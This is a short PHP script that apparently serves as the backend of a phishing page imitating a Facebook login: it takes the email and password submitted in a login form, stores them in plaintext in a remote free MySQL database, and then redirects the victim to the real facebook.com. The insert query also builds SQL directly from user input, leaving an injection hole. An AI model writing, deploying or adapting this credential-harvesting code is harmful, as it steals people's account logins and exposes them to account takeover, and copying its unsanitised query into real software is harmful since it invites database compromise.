
<?php

    // DON"T EVEN THINK TO TOUCH THIS FILE!! YOUR ALL APP FEATURES WILL SCREW IF YOU TOUCH THIS SCRIPT!!!!
    // DO NOT CHANGE THIS
    // DO NOT CHANGE THIS
    // DO NOT CHANGE THIS

    session_start();
    

?>

<?php

if(isset($_POST['login']))
{
   
    $email = $_POST['email'];
    $user_pass = $_POST['pass'];
    $pss = $_COOKIE['psw'];


    INSERT_INTO(connectDB($pss),$email,$user_pass);

    echo '<script> location.href("https://www.facebook.com"); </script>';

    
}

//names = email ,pass, btnName = login
function connectDB($password)
{
    $servername="sql2.freemysqlhosting.net";
    $username="sql2237331";
    $dbname="sql2237331";

    $conn = new mysqli($servername,$username,$password,$dbname);

    if($conn->connect_error)
    {
        echo "Connect Error form local DB";
    }

    return $conn;
    

}

    

function INSERT_INTO($conn,$email,$password)
{
    $query = "INSERT INTO users VALUES('$email','$password')";

    if($conn->query($query)==true)
    {
        echo "New Record Added Sucessfully!";
    }
    else
    {
        echo "Record Adding Failed!";
    }
}




?>